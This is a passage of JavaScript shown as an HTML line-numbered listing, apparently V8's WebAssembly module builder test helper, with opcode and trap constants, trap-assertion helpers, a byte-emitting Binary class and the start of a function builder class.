kExprI64x2Neg = 0xc1;</td></tr><tr><td class="line-number" value="943"></td><td class="line-content">  let kExprI64x2AllTrue = 0xc3;</td></tr><tr><td class="line-number" value="944"></td><td class="line-content">  let kExprI64x2BitMask = 0xc4;</td></tr><tr><td class="line-number" value="945"></td><td class="line-content">  let kExprI64x2SConvertI32x4Low = 0xc7;</td></tr><tr><td class="line-number" value="946"></td><td class="line-content">  let kExprI64x2SConvertI32x4High = 0xc8;</td></tr><tr><td class="line-number" value="947"></td><td class="line-content">  let kExprI64x2UConvertI32x4Low = 0xc9;</td></tr><tr><td class="line-number" value="948"></td><td class="line-content">  let kExprI64x2UConvertI32x4High = 0xca;</td></tr><tr><td class="line-number" value="949"></td><td class="line-content">  let kExprI64x2Shl = 0xcb;</td></tr><tr><td class="line-number" value="950"></td><td class="line-content">  let kExprI64x2ShrS = 0xcc;</td></tr><tr><td class="line-number" value="951"></td><td class="line-content">  let kExprI64x2ShrU = 0xcd;</td></tr><tr><td class="line-number" value="952"></td><td class="line-content">  let kExprI64x2Add = 0xce;</td></tr><tr><td class="line-number" value="953"></td><td class="line-content">  let kExprI64x2Sub = 0xd1;</td></tr><tr><td class="line-number" value="954"></td><td class="line-content">  let kExprI64x2Mul = 0xd5;</td></tr><tr><td class="line-number" value="955"></td><td class="line-content">  let kExprI64x2Eq = 0xd6;</td></tr><tr><td class="line-number" value="956"></td><td class="line-content">  let kExprI64x2Ne = 0xd7;</td></tr><tr><td class="line-number" value="957"></td><td class="line-content">  let kExprI64x2LtS = 0xd8;</td></tr><tr><td class="line-number" value="958"></td><td class="line-content">  let kExprI64x2GtS = 0xd9;</td></tr><tr><td class="line-number" value="959"></td><td class="line-content">  let kExprI64x2LeS = 0xda;</td></tr><tr><td class="line-number" value="960"></td><td class="line-content">  let kExprI64x2GeS = 0xdb;</td></tr><tr><td class="line-number" value="961"></td><td class="line-content">  let kExprI64x2ExtMulLowI32x4S = 0xdc;</td></tr><tr><td class="line-number" value="962"></td><td class="line-content">  let kExprI64x2ExtMulHighI32x4S = 0xdd;</td></tr><tr><td class="line-number" value="963"></td><td class="line-content">  let kExprI64x2ExtMulLowI32x4U = 0xde;</td></tr><tr><td class="line-number" value="964"></td><td class="line-content">  let kExprI64x2ExtMulHighI32x4U = 0xdf;</td></tr><tr><td class="line-number" value="965"></td><td class="line-content">  let kExprF32x4Abs = 0xe0;</td></tr><tr><td class="line-number" value="966"></td><td class="line-content">  let kExprF32x4Neg = 0xe1;</td></tr><tr><td class="line-number" value="967"></td><td class="line-content">  let kExprF32x4Sqrt = 0xe3;</td></tr><tr><td class="line-number" value="968"></td><td class="line-content">  let kExprF32x4Add = 0xe4;</td></tr><tr><td class="line-number" value="969"></td><td class="line-content">  let kExprF32x4Sub = 0xe5;</td></tr><tr><td class="line-number" value="970"></td><td class="line-content">  let kExprF32x4Mul = 0xe6;</td></tr><tr><td class="line-number" value="971"></td><td class="line-content">  let kExprF32x4Div = 0xe7;</td></tr><tr><td class="line-number" value="972"></td><td class="line-content">  let kExprF32x4Min = 0xe8;</td></tr><tr><td class="line-number" value="973"></td><td class="line-content">  let kExprF32x4Max = 0xe9;</td></tr><tr><td class="line-number" value="974"></td><td class="line-content">  let kExprF32x4Pmin = 0xea;</td></tr><tr><td class="line-number" value="975"></td><td class="line-content">  let kExprF32x4Pmax = 0xeb;</td></tr><tr><td class="line-number" value="976"></td><td class="line-content">  let kExprF64x2Abs = 0xec;</td></tr><tr><td class="line-number" value="977"></td><td class="line-content">  let kExprF64x2Neg = 0xed;</td></tr><tr><td class="line-number" value="978"></td><td class="line-content">  let kExprF64x2Sqrt = 0xef;</td></tr><tr><td class="line-number" value="979"></td><td class="line-content">  let kExprF64x2Add = 0xf0;</td></tr><tr><td class="line-number" value="980"></td><td class="line-content">  let kExprF64x2Sub = 0xf1;</td></tr><tr><td class="line-number" value="981"></td><td class="line-content">  let kExprF64x2Mul = 0xf2;</td></tr><tr><td class="line-number" value="982"></td><td class="line-content">  let kExprF64x2Div = 0xf3;</td></tr><tr><td class="line-number" value="983"></td><td class="line-content">  let kExprF64x2Min = 0xf4;</td></tr><tr><td class="line-number" value="984"></td><td class="line-content">  let kExprF64x2Max = 0xf5;</td></tr><tr><td class="line-number" value="985"></td><td class="line-content">  let kExprF64x2Pmin = 0xf6;</td></tr><tr><td class="line-number" value="986"></td><td class="line-content">  let kExprF64x2Pmax = 0xf7;</td></tr><tr><td class="line-number" value="987"></td><td class="line-content">  let kExprI32x4SConvertF32x4 = 0xf8;</td></tr><tr><td class="line-number" value="988"></td><td class="line-content">  let kExprI32x4UConvertF32x4 = 0xf9;</td></tr><tr><td class="line-number" value="989"></td><td class="line-content">  let kExprF32x4SConvertI32x4 = 0xfa;</td></tr><tr><td class="line-number" value="990"></td><td class="line-content">  let kExprF32x4UConvertI32x4 = 0xfb;</td></tr><tr><td class="line-number" value="991"></td><td class="line-content">  let kExprI32x4TruncSatF64x2SZero = 0xfc;</td></tr><tr><td class="line-number" value="992"></td><td class="line-content">  let kExprI32x4TruncSatF64x2UZero = 0xfd;</td></tr><tr><td class="line-number" value="993"></td><td class="line-content">  let kExprF64x2ConvertLowI32x4S = 0xfe;</td></tr><tr><td class="line-number" value="994"></td><td class="line-content">  let kExprF64x2ConvertLowI32x4U = 0xff;</td></tr><tr><td class="line-number" value="995"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="996"></td><td class="line-content">  // Relaxed SIMD.</td></tr><tr><td class="line-number" value="997"></td><td class="line-content">  let kExprI8x16RelaxedSwizzle = wasmSignedLeb(0x100);</td></tr><tr><td class="line-number" value="998"></td><td class="line-content">  let kExprI32x4RelaxedTruncF32x4S = wasmSignedLeb(0x101);</td></tr><tr><td class="line-number" value="999"></td><td class="line-content">  let kExprI32x4RelaxedTruncF32x4U = wasmSignedLeb(0x102);</td></tr><tr><td class="line-number" value="1000"></td><td class="line-content">  let kExprI32x4RelaxedTruncF64x2SZero = wasmSignedLeb(0x103);</td></tr><tr><td class="line-number" value="1001"></td><td class="line-content">  let kExprI32x4RelaxedTruncF64x2UZero = wasmSignedLeb(0x104);</td></tr><tr><td class="line-number" value="1002"></td><td class="line-content">  let kExprF32x4Qfma = wasmSignedLeb(0x105);</td></tr><tr><td class="line-number" value="1003"></td><td class="line-content">  let kExprF32x4Qfms = wasmSignedLeb(0x106);</td></tr><tr><td class="line-number" value="1004"></td><td class="line-content">  let kExprF64x2Qfma = wasmSignedLeb(0x107);</td></tr><tr><td class="line-number" value="1005"></td><td class="line-content">  let kExprF64x2Qfms = wasmSignedLeb(0x108);</td></tr><tr><td class="line-number" value="1006"></td><td class="line-content">  let kExprI8x16RelaxedLaneSelect = wasmSignedLeb(0x109);</td></tr><tr><td class="line-number" value="1007"></td><td class="line-content">  let kExprI16x8RelaxedLaneSelect = wasmSignedLeb(0x10a);</td></tr><tr><td class="line-number" value="1008"></td><td class="line-content">  let kExprI32x4RelaxedLaneSelect = wasmSignedLeb(0x10b);</td></tr><tr><td class="line-number" value="1009"></td><td class="line-content">  let kExprI64x2RelaxedLaneSelect = wasmSignedLeb(0x10c);</td></tr><tr><td class="line-number" value="1010"></td><td class="line-content">  let kExprF32x4RelaxedMin = wasmSignedLeb(0x10d);</td></tr><tr><td class="line-number" value="1011"></td><td class="line-content">  let kExprF32x4RelaxedMax = wasmSignedLeb(0x10e);</td></tr><tr><td class="line-number" value="1012"></td><td class="line-content">  let kExprF64x2RelaxedMin = wasmSignedLeb(0x10f);</td></tr><tr><td class="line-number" value="1013"></td><td class="line-content">  let kExprF64x2RelaxedMax = wasmSignedLeb(0x110);</td></tr><tr><td class="line-number" value="1014"></td><td class="line-content">  let kExprI16x8RelaxedQ15MulRS = wasmSignedLeb(0x111);</td></tr><tr><td class="line-number" value="1015"></td><td class="line-content">  let kExprI16x8DotI8x16I7x16S = wasmSignedLeb(0x112);</td></tr><tr><td class="line-number" value="1016"></td><td class="line-content">  let kExprI32x4DotI8x16I7x16AddS = wasmSignedLeb(0x113);</td></tr><tr><td class="line-number" value="1017"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1018"></td><td class="line-content">  // Compilation hint constants.</td></tr><tr><td class="line-number" value="1019"></td><td class="line-content">  let kCompilationHintStrategyDefault = 0x00;</td></tr><tr><td class="line-number" value="1020"></td><td class="line-content">  let kCompilationHintStrategyLazy = 0x01;</td></tr><tr><td class="line-number" value="1021"></td><td class="line-content">  let kCompilationHintStrategyEager = 0x02;</td></tr><tr><td class="line-number" value="1022"></td><td class="line-content">  let kCompilationHintStrategyLazyBaselineEagerTopTier = 0x03;</td></tr><tr><td class="line-number" value="1023"></td><td class="line-content">  let kCompilationHintTierDefault = 0x00;</td></tr><tr><td class="line-number" value="1024"></td><td class="line-content">  let kCompilationHintTierBaseline = 0x01;</td></tr><tr><td class="line-number" value="1025"></td><td class="line-content">  let kCompilationHintTierOptimized = 0x02;</td></tr><tr><td class="line-number" value="1026"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1027"></td><td class="line-content">  let kTrapUnreachable = 0;</td></tr><tr><td class="line-number" value="1028"></td><td class="line-content">  let kTrapMemOutOfBounds = 1;</td></tr><tr><td class="line-number" value="1029"></td><td class="line-content">  let kTrapDivByZero = 2;</td></tr><tr><td class="line-number" value="1030"></td><td class="line-content">  let kTrapDivUnrepresentable = 3;</td></tr><tr><td class="line-number" value="1031"></td><td class="line-content">  let kTrapRemByZero = 4;</td></tr><tr><td class="line-number" value="1032"></td><td class="line-content">  let kTrapFloatUnrepresentable = 5;</td></tr><tr><td class="line-number" value="1033"></td><td class="line-content">  let kTrapTableOutOfBounds = 6;</td></tr><tr><td class="line-number" value="1034"></td><td class="line-content">  let kTrapFuncSigMismatch = 7;</td></tr><tr><td class="line-number" value="1035"></td><td class="line-content">  let kTrapUnalignedAccess = 8;</td></tr><tr><td class="line-number" value="1036"></td><td class="line-content">  let kTrapDataSegmentOutOfBounds = 9;</td></tr><tr><td class="line-number" value="1037"></td><td class="line-content">  let kTrapElementSegmentOutOfBounds = 10;</td></tr><tr><td class="line-number" value="1038"></td><td class="line-content">  let kTrapRethrowNull = 11;</td></tr><tr><td class="line-number" value="1039"></td><td class="line-content">  let kTrapArrayTooLarge = 12;</td></tr><tr><td class="line-number" value="1040"></td><td class="line-content">  let kTrapArrayOutOfBounds = 13;</td></tr><tr><td class="line-number" value="1041"></td><td class="line-content">  let kTrapNullDereference = 14;</td></tr><tr><td class="line-number" value="1042"></td><td class="line-content">  let kTrapIllegalCast = 15;</td></tr><tr><td class="line-number" value="1043"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1044"></td><td class="line-content">  let kAtomicWaitOk = 0;</td></tr><tr><td class="line-number" value="1045"></td><td class="line-content">  let kAtomicWaitNotEqual = 1;</td></tr><tr><td class="line-number" value="1046"></td><td class="line-content">  let kAtomicWaitTimedOut = 2;</td></tr><tr><td class="line-number" value="1047"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1048"></td><td class="line-content">  // Exception handling with exnref.</td></tr><tr><td class="line-number" value="1049"></td><td class="line-content">  let kCatchNoRef = 0x0;</td></tr><tr><td class="line-number" value="1050"></td><td class="line-content">  let kCatchRef = 0x1;</td></tr><tr><td class="line-number" value="1051"></td><td class="line-content">  let kCatchAllNoRef = 0x2;</td></tr><tr><td class="line-number" value="1052"></td><td class="line-content">  let kCatchAllRef = 0x3;</td></tr><tr><td class="line-number" value="1053"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1054"></td><td class="line-content">  let kTrapMsgs = [</td></tr><tr><td class="line-number" value="1055"></td><td class="line-content">  'unreachable',                                    // --</td></tr><tr><td class="line-number" value="1056"></td><td class="line-content">  'memory access out of bounds',                    // --</td></tr><tr><td class="line-number" value="1057"></td><td class="line-content">  'divide by zero',                                 // --</td></tr><tr><td class="line-number" value="1058"></td><td class="line-content">  'divide result unrepresentable',                  // --</td></tr><tr><td class="line-number" value="1059"></td><td class="line-content">  'remainder by zero',                              // --</td></tr><tr><td class="line-number" value="1060"></td><td class="line-content">  'float unrepresentable in integer range',         // --</td></tr><tr><td class="line-number" value="1061"></td><td class="line-content">  'table index is out of bounds',                   // --</td></tr><tr><td class="line-number" value="1062"></td><td class="line-content">  'null function or function signature mismatch',   // --</td></tr><tr><td class="line-number" value="1063"></td><td class="line-content">  'operation does not support unaligned accesses',  // --</td></tr><tr><td class="line-number" value="1064"></td><td class="line-content">  'data segment out of bounds',                     // --</td></tr><tr><td class="line-number" value="1065"></td><td class="line-content">  'element segment out of bounds',                  // --</td></tr><tr><td class="line-number" value="1066"></td><td class="line-content">  'rethrowing null value',                          // --</td></tr><tr><td class="line-number" value="1067"></td><td class="line-content">  'requested new array is too large',               // --</td></tr><tr><td class="line-number" value="1068"></td><td class="line-content">  'array element access out of bounds',             // --</td></tr><tr><td class="line-number" value="1069"></td><td class="line-content">  'dereferencing a null pointer',                   // --</td></tr><tr><td class="line-number" value="1070"></td><td class="line-content">  'illegal cast',                                   // --</td></tr><tr><td class="line-number" value="1071"></td><td class="line-content">  ];</td></tr><tr><td class="line-number" value="1072"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1073"></td><td class="line-content">  // This requires test/mjsunit/mjsunit.js.</td></tr><tr><td class="line-number" value="1074"></td><td class="line-content">  function assertTraps(trap, code) {</td></tr><tr><td class="line-number" value="1075"></td><td class="line-content">  assertThrows(code, WebAssembly.RuntimeError, new RegExp(kTrapMsgs[trap]));</td></tr><tr><td class="line-number" value="1076"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1077"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1078"></td><td class="line-content">  function assertTrapsOneOf(traps, code) {</td></tr><tr><td class="line-number" value="1079"></td><td class="line-content">  const errorChecker = new RegExp(</td></tr><tr><td class="line-number" value="1080"></td><td class="line-content">    '(' + traps.map(trap =&gt; kTrapMsgs[trap]).join('|') + ')'</td></tr><tr><td class="line-number" value="1081"></td><td class="line-content">  );</td></tr><tr><td class="line-number" value="1082"></td><td class="line-content">  assertThrows(code, WebAssembly.RuntimeError, errorChecker);</td></tr><tr><td class="line-number" value="1083"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1084"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1085"></td><td class="line-content">  class Binary {</td></tr><tr><td class="line-number" value="1086"></td><td class="line-content">  constructor() {</td></tr><tr><td class="line-number" value="1087"></td><td class="line-content">    this.length = 0;</td></tr><tr><td class="line-number" value="1088"></td><td class="line-content">    this.buffer = new Uint8Array(8192);</td></tr><tr><td class="line-number" value="1089"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1090"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1091"></td><td class="line-content">  ensure_space(needed) {</td></tr><tr><td class="line-number" value="1092"></td><td class="line-content">    if (this.buffer.length - this.length &gt;= needed) return;</td></tr><tr><td class="line-number" value="1093"></td><td class="line-content">    let new_capacity = this.buffer.length * 2;</td></tr><tr><td class="line-number" value="1094"></td><td class="line-content">    while (new_capacity - this.length &lt; needed) new_capacity *= 2;</td></tr><tr><td class="line-number" value="1095"></td><td class="line-content">    let new_buffer = new Uint8Array(new_capacity);</td></tr><tr><td class="line-number" value="1096"></td><td class="line-content">    new_buffer.set(this.buffer);</td></tr><tr><td class="line-number" value="1097"></td><td class="line-content">    this.buffer = new_buffer;</td></tr><tr><td class="line-number" value="1098"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1099"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1100"></td><td class="line-content">  trunc_buffer() {</td></tr><tr><td class="line-number" value="1101"></td><td class="line-content">    return new Uint8Array(this.buffer.buffer, 0, this.length);</td></tr><tr><td class="line-number" value="1102"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1103"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1104"></td><td class="line-content">  reset() {</td></tr><tr><td class="line-number" value="1105"></td><td class="line-content">    this.length = 0;</td></tr><tr><td class="line-number" value="1106"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1107"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1108"></td><td class="line-content">  emit_u8(val) {</td></tr><tr><td class="line-number" value="1109"></td><td class="line-content">    this.ensure_space(1);</td></tr><tr><td class="line-number" value="1110"></td><td class="line-content">    this.buffer[this.length++] = val;</td></tr><tr><td class="line-number" value="1111"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1112"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1113"></td><td class="line-content">  emit_u16(val) {</td></tr><tr><td class="line-number" value="1114"></td><td class="line-content">    this.ensure_space(2);</td></tr><tr><td class="line-number" value="1115"></td><td class="line-content">    this.buffer[this.length++] = val;</td></tr><tr><td class="line-number" value="1116"></td><td class="line-content">    this.buffer[this.length++] = val &gt;&gt; 8;</td></tr><tr><td class="line-number" value="1117"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1118"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1119"></td><td class="line-content">  emit_u32(val) {</td></tr><tr><td class="line-number" value="1120"></td><td class="line-content">    this.ensure_space(4);</td></tr><tr><td class="line-number" value="1121"></td><td class="line-content">    this.buffer[this.length++] = val;</td></tr><tr><td class="line-number" value="1122"></td><td class="line-content">    this.buffer[this.length++] = val &gt;&gt; 8;</td></tr><tr><td class="line-number" value="1123"></td><td class="line-content">    this.buffer[this.length++] = val &gt;&gt; 16;</td></tr><tr><td class="line-number" value="1124"></td><td class="line-content">    this.buffer[this.length++] = val &gt;&gt; 24;</td></tr><tr><td class="line-number" value="1125"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1126"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1127"></td><td class="line-content">  emit_leb_u(val, max_len) {</td></tr><tr><td class="line-number" value="1128"></td><td class="line-content">    this.ensure_space(max_len);</td></tr><tr><td class="line-number" value="1129"></td><td class="line-content">    for (let i = 0; i &lt; max_len; ++i) {</td></tr><tr><td class="line-number" value="1130"></td><td class="line-content">      let v = val &amp; 0xff;</td></tr><tr><td class="line-number" value="1131"></td><td class="line-content">      val = val &gt;&gt;&gt; 7;</td></tr><tr><td class="line-number" value="1132"></td><td class="line-content">      if (val == 0) {</td></tr><tr><td class="line-number" value="1133"></td><td class="line-content">        this.buffer[this.length++] = v;</td></tr><tr><td class="line-number" value="1134"></td><td class="line-content">        return;</td></tr><tr><td class="line-number" value="1135"></td><td class="line-content">      }</td></tr><tr><td class="line-number" value="1136"></td><td class="line-content">      this.buffer[this.length++] = v | 0x80;</td></tr><tr><td class="line-number" value="1137"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1138"></td><td class="line-content">    throw new Error('Leb value exceeds maximum length of ' + max_len);</td></tr><tr><td class="line-number" value="1139"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1140"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1141"></td><td class="line-content">  emit_u32v(val) {</td></tr><tr><td class="line-number" value="1142"></td><td class="line-content">    this.emit_leb_u(val, kMaxVarInt32Size);</td></tr><tr><td class="line-number" value="1143"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1144"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1145"></td><td class="line-content">  emit_u64v(val) {</td></tr><tr><td class="line-number" value="1146"></td><td class="line-content">    this.emit_leb_u(val, kMaxVarInt64Size);</td></tr><tr><td class="line-number" value="1147"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1148"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1149"></td><td class="line-content">  emit_bytes(data) {</td></tr><tr><td class="line-number" value="1150"></td><td class="line-content">    this.ensure_space(data.length);</td></tr><tr><td class="line-number" value="1151"></td><td class="line-content">    this.buffer.set(data, this.length);</td></tr><tr><td class="line-number" value="1152"></td><td class="line-content">    this.length += data.length;</td></tr><tr><td class="line-number" value="1153"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1154"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1155"></td><td class="line-content">  emit_string(string) {</td></tr><tr><td class="line-number" value="1156"></td><td class="line-content">    // When testing illegal names, we pass a byte array directly.</td></tr><tr><td class="line-number" value="1157"></td><td class="line-content">    if (string instanceof Array) {</td></tr><tr><td class="line-number" value="1158"></td><td class="line-content">      this.emit_u32v(string.length);</td></tr><tr><td class="line-number" value="1159"></td><td class="line-content">      this.emit_bytes(string);</td></tr><tr><td class="line-number" value="1160"></td><td class="line-content">      return;</td></tr><tr><td class="line-number" value="1161"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1162"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1163"></td><td class="line-content">    // This is the hacky way to convert a JavaScript string to a UTF8 encoded</td></tr><tr><td class="line-number" value="1164"></td><td class="line-content">    // string only containing single-byte characters.</td></tr><tr><td class="line-number" value="1165"></td><td class="line-content">    let string_utf8 = unescape(encodeURIComponent(string));</td></tr><tr><td class="line-number" value="1166"></td><td class="line-content">    this.emit_u32v(string_utf8.length);</td></tr><tr><td class="line-number" value="1167"></td><td class="line-content">    for (let i = 0; i &lt; string_utf8.length; i++) {</td></tr><tr><td class="line-number" value="1168"></td><td class="line-content">      this.emit_u8(string_utf8.charCodeAt(i));</td></tr><tr><td class="line-number" value="1169"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1170"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1171"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1172"></td><td class="line-content">  emit_heap_type(heap_type) {</td></tr><tr><td class="line-number" value="1173"></td><td class="line-content">    this.emit_bytes(wasmSignedLeb(heap_type, kMaxVarInt32Size));</td></tr><tr><td class="line-number" value="1174"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1175"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1176"></td><td class="line-content">  emit_type(type) {</td></tr><tr><td class="line-number" value="1177"></td><td class="line-content">    if ((typeof type) == 'number') {</td></tr><tr><td class="line-number" value="1178"></td><td class="line-content">      this.emit_u8(type &gt;= 0 ? type : type &amp; kLeb128Mask);</td></tr><tr><td class="line-number" value="1179"></td><td class="line-content">    } else {</td></tr><tr><td class="line-number" value="1180"></td><td class="line-content">      this.emit_u8(type.opcode);</td></tr><tr><td class="line-number" value="1181"></td><td class="line-content">      if ('depth' in type) this.emit_u8(type.depth);</td></tr><tr><td class="line-number" value="1182"></td><td class="line-content">      this.emit_heap_type(type.heap_type);</td></tr><tr><td class="line-number" value="1183"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1184"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1185"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1186"></td><td class="line-content">  emit_init_expr(expr) {</td></tr><tr><td class="line-number" value="1187"></td><td class="line-content">    this.emit_bytes(expr);</td></tr><tr><td class="line-number" value="1188"></td><td class="line-content">    this.emit_u8(kExprEnd);</td></tr><tr><td class="line-number" value="1189"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1190"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1191"></td><td class="line-content">  emit_header() {</td></tr><tr><td class="line-number" value="1192"></td><td class="line-content">    this.emit_bytes([</td></tr><tr><td class="line-number" value="1193"></td><td class="line-content">      kWasmH0, kWasmH1, kWasmH2, kWasmH3, kWasmV0, kWasmV1, kWasmV2, kWasmV3</td></tr><tr><td class="line-number" value="1194"></td><td class="line-content">    ]);</td></tr><tr><td class="line-number" value="1195"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1196"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1197"></td><td class="line-content">  emit_section(section_code, content_generator) {</td></tr><tr><td class="line-number" value="1198"></td><td class="line-content">    // Emit section name.</td></tr><tr><td class="line-number" value="1199"></td><td class="line-content">    this.emit_u8(section_code);</td></tr><tr><td class="line-number" value="1200"></td><td class="line-content">    // Emit the section to a temporary buffer: its full length isn't know yet.</td></tr><tr><td class="line-number" value="1201"></td><td class="line-content">    const section = new Binary;</td></tr><tr><td class="line-number" value="1202"></td><td class="line-content">    content_generator(section);</td></tr><tr><td class="line-number" value="1203"></td><td class="line-content">    // Emit section length.</td></tr><tr><td class="line-number" value="1204"></td><td class="line-content">    this.emit_u32v(section.length);</td></tr><tr><td class="line-number" value="1205"></td><td class="line-content">    // Copy the temporary buffer.</td></tr><tr><td class="line-number" value="1206"></td><td class="line-content">    // Avoid spread because {section} can be huge.</td></tr><tr><td class="line-number" value="1207"></td><td class="line-content">    this.emit_bytes(section.trunc_buffer());</td></tr><tr><td class="line-number" value="1208"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1209"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1210"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1211"></td><td class="line-content">  class WasmFunctionBuilder {</td></tr><tr><td class="line-number" value="1212"></td><td class="line-content">  // Encoding of local names: a string corresponds to a local name,</td></tr><tr><td class="line-number" value="1213"></td><td class="line-content">  // a number n corresponds to n undefined names.</td></tr><tr><td class="line-number" value="1214"></td><td class="line-content">  constructor(module, name, type_index, arg_names) {</td></tr><tr><td class="line-number" value="1215"></td><td class="line-content">    this.module = module;</td></tr><tr><td class="line-number" value="1216"></td><td class="line-content">    this.name = name;</td></tr><tr><td class="line-number" value="1217"></td><td class="line-content">    this.type_index = type_index;</td></tr><tr><td class="line-number" value="1218"></td><td class="line-content">    this.body = [];</td></tr><tr><td class="line-number" value="1219"></td><td class="line-content">    this.locals = [];</td></tr><tr><td class="line-number" value="1220"></td><td class="line-content">    this.local_names = arg_names;</td></tr><tr><td class="line-number" value="1221"></td><td class="line-content">    this.body_offset = undefined;  // Not valid until module is serialized.</td></tr><tr><td class="line-number" value="1222"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1223"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1224"></td><td class="line-content">  numLocalNames() {</td></tr><tr><td class="line-number" value="1225"></td><td class="line-content">    let num_local_names = 0;</td></tr><tr><td class="line-number" value="1226"></td><td class="line-content">    for (let loc_name of this.local_names) {</td></tr><tr><td class="line-number" value="1227"></td><td class="line-content">      if (typeof loc_name == 'string') ++num_local_names;</td></tr><tr><td class="line-number" value="1228"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1229"></td><td class="line-content">    return num_local_names;</td></tr><tr><td class="line-number" value="1230"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1231"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1232"></td><td class="line-content">  exportAs(name) {</td></tr><tr><td class="line-number" value="1233"></td><td class="line-content">    this.module.addExport(name, this.index);</td></tr><tr><td class="line-number" value="1234"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1235"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1236"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1237"></td><td class="line-content">  exportFunc() {</td></tr><tr><td class="line-number" value="1238"></td><td class="line-content">    this.exportAs(this.name);</td></tr><tr><td class="line-number" value="1239"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1240"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1241"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1242"></td><td class="line-content">  setCompilationHint(strategy, baselineTier, topTier) {</td></tr><tr><td class="line-number" value="1243"></td><td class="line-content">    this.module.setCompilationHint(strategy, baselineTier, topTier, this.index);</td></tr><tr><td class="line-number" value="1244"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1245"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1246"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1247"></td><td class="line-content">  addBody(body) {</td></tr><tr><td class="line-number" value="1248"></td><td class="line-content">    checkExpr(body);</td></tr><tr><td class="line-number" value="1249"></td><td class="line-content">    // Store a copy of the body, and automatically add the end opcode.</td></tr><tr><td class="line-number" value="1250"></td><td class="line-content">    this.body = body.concat([kExprEnd]);</td></tr><tr><td class="line-number" value="1251"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1252"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1253"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1254"></td><td class="line-content">  addBodyWithEnd(body) {</td></tr><tr><td class="line-number" value="1255"></td><td class="line-content">    this.body = body;</td></tr><tr><td class="line-number" value="1256"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1257"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1258"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1259"></td><td class="line-content">  getNumLocals() {</td></tr><tr><td class="line-number" value="1260"></td><td class="line-content">    let total_locals = 0;</td></tr><tr><td class="line-number" value="1261"></td><td class="line-content">    for (let l of this.locals) {</td></tr><tr><td class="line-number" value="1262"></td><td class="line-content">      total_locals += l.count</td></tr><tr><td class="line-number" value="1263"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1264"></td><td class="line-content">    return total_locals;</td></tr><tr><td class="line-number" value="1265"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1266"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1267"></td><td class="line-content">  addLocals(type, count, names) {</td></tr><tr><td class="line-number" value="1268"></td><td class="line-content">    this.locals.push({type: type, count: count});</td></tr><tr><td class="line-number" value="1269"></td><td class="line-content">    names = names || [];</td></tr><tr><td class="line-number" value="1270"></td><td class="line-content">    if (names.length &gt; count) throw new Error('too many locals names given');</td></tr><tr><td class="line-number" value="1271"></td><td class="line-content">    this.local_names.push(...names);</td></tr><tr><td class="line-number" value="1272"></td><td class="line-content">    if (count 